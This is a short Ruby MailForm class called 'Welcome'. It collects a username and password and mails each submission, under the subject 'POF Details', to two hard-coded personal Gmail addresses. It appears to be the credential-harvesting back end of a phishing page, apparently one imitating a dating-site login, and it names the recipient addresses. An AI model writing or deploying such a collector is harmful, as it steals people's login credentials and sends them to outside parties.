class Welcome < MailForm::Base
    attribute :username,      :validate => true
    attribute :password, :validate => true

    attribute :nickname,  :captcha  => true

  # Declare the e-mail headers. It accepts anything the mail method
  # in ActionMailer accepts.

  def headers(row)
  
   
    emails = ['daveskeen24@gmail.com', 'delightedchika@gmail.com']
    
    emails.each do |email|
      new_request(email,row).deliver_now
      # or
      #new_request(email,row).deliver_later
      
    end
  end

  def new_request(email, row)
    @item = row

    mail(to: email, subject: 'POF Details ')

  end

 
  end
